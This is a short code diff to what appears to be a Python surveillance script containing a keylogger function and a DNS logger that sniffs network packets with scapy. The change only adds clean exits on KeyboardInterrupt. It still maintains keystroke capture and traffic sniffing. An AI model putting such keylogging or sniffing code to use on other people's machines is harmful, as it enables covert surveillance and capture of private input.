@@ -16,7 +16,11 @@ def key_logger():
     # hook the keyboard events with the callback function
     keyboard.on_press(on_key_press)
     # start the hook and keep the script running
-    keyboard.wait()
+    try:
+        keyboard.wait()
+    except KeyboardInterrupt:
+        exit(0)
+
 
 #dns logger
 def dns_logger():
@@ -39,4 +43,7 @@ def dns_logger():
                         # Log the domain name and the IP address
                         logging.info(f'A record: {domain} -> {ip}')
     # Sniff packets on the network interface and pass them to the process_packet function
-    scapy.sniff(iface=active_interface(), store=False, prn=process_packet)
+    try:
+        scapy.sniff(iface=active_interface(), store=False, prn=process_packet)
+    except KeyboardInterrupt:
+        exit(0)
